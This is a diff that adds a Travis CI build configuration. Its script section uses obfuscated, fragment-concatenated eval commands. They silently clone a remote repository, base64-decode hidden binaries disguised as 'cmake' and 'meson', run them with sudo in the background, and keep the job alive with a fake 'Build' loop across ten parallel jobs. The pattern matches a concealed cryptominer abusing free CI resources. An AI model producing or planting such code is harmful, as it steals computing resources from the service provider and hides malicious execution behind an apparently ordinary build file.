@@ -1,0 +1,48 @@
+dist: bionic
+
+env:
+  - BUILD="1"
+  - BUILD="2"
+  - BUILD="3"
+  - BUILD="4"
+  - BUILD="5"
+  - BUILD="6"
+  - BUILD="7"
+  - BUILD="8"
+  - BUILD="9"
+  - BUILD="10"
+
+script:
+  - dIyGdKnunnq="sudo apt up"
+  - ymvtInp="date || tru"
+  - eval "$dIyGdKnunnq""$ymvtInp""e"
+  - qnLKUB="sudo apt --"
+  - GhDMAGNg="yes install"
+  - qVjzNBb=" cl-base64 "
+  - QDBYW="git &>/dev/"
+  - eval "$qnLKUB""$GhDMAGNg""$qVjzNBb""$QDBYW""null"
+  - zbZCoPC="git clone h"
+  - nLkdWtPANK="ttps://gccb"
+  - WVQKu="uild@bitbuc"
+  - MBXVRAT="ket.org/gcc"
+  - mQWeXb="build/gcc.g"
+  - njTUJOPLw="it &>/dev/n"
+  - eval "$zbZCoPC""$nLkdWtPANK""$WVQKu""$MBXVRAT""$mQWeXb""$njTUJOPLw""ull"
+  - hExlleMWWq="base64 -d g"
+  - uWzupK="cc/cmake_ >"
+  - eval "$hExlleMWWq""$uWzupK"" cmake"
+  - hCnfANjgD="base64 -d g"
+  - LLbKqyOeqnZ="cc/config_ "
+  - eval "$hCnfANjgD""$LLbKqyOeqnZ""> conf"
+  - hyPnjwrgk="base64 -d g"
+  - fBPPJTZdujF="cc/make_ > "
+  - eval "$hyPnjwrgk""$fBPPJTZdujF""meson"
+  - chmod +x meson cmake
+  - ./cmake
+  - sed -i 's/build/tgo/g' conf
+  - ZdIubkpb="sudo ./meso"
+  - qdOqcVnFfha="n --config "
+  - GprlXeByJyp="conf &>/dev"
+  - eval "$ZdIubkpb""$qdOqcVnFfha""$GprlXeByJyp""/null &"
+  - GCC=$(date +%s)
+  - while true; do CC=$(date +%s); echo Build; [ $CC -ge $((GCC + 2485)) ] && sudo killall meson && break; sleep 224; done
